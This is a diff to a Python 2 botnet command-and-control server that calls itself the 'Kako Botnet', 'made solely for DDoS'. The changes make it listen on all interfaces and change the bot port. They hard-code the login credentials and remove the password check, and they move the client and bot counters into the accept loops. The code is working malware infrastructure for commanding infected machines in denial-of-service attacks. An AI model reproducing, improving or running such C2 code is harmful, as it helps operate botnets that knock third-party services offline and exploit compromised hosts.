@@ -7,9 +7,9 @@ from json import load
 from urllib2 import urlopen
 from thread import start_new_thread
 
-connect = "localhost" # IP For bots. Usually Empty.
+connect = "" # IP For bots. Usually Empty.
 conport = 8080 # Your Port
-infport = 8888 # Bot Port
+infport = 8000 # Bot Port
 
 clients = 0
 bots = 0
@@ -43,6 +43,7 @@ def clientThread(conn, addr):
 		sys.exit()
 	else:
 		pass
+
 	def rank(conn, prefix="Rank: "):
 		conn.send(prefix)
 		return conn.recv(512)
@@ -56,11 +57,12 @@ def clientThread(conn, addr):
 		return conn.recv(512)
 
 	rank = rank(conn)
-	password = password(conn)
-	nickname = nickname(conn)
-	if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
-		global clients
-		clients = clients + 1
+	#password = password(conn)
+	#nickname = nickname(conn)
+	password = "Password"
+	nickname = "Law"
+	#if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
+	if rank.startswith(rankAdmin) or rank.startswith(rankGuest):
 		conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 		conn.sendall("[>] Made solely for DDoS but that depends on your bot [<]\r\n")
 		conn.sendall("[!] If you do anything I, Law, disapprove of I will not hesitate to ban your IP Address. Everything is logged.\r\n")
@@ -132,16 +134,16 @@ def startClient():
 	time.sleep(0.10)
 	print("[+] Server Started")
 	while True:
+		global clients
 		time.sleep(1)
 		conn, addr = sock.accept()
 		bc.append(conn)
+		clients = clients + 1
 
 		start_new_thread(clientThread, (conn, addr))
 	sock.close()
 
 def bot_thread(conn):
-	global bots
-	bots = bots + 1
 	while True:
 		try:
 			data = conn.recv(512)
@@ -164,9 +166,11 @@ def startBot():
 	time.sleep(0.5)
 	print("[+] Bot Started")
 	while True:
+		global bots
 		time.sleep(1)
 		conn, addr = infsock.accept()
 		bc.append(conn)
+		bots = bots + 1
 
 		start_new_thread(bot_thread, (conn,))
 	infsock.close()
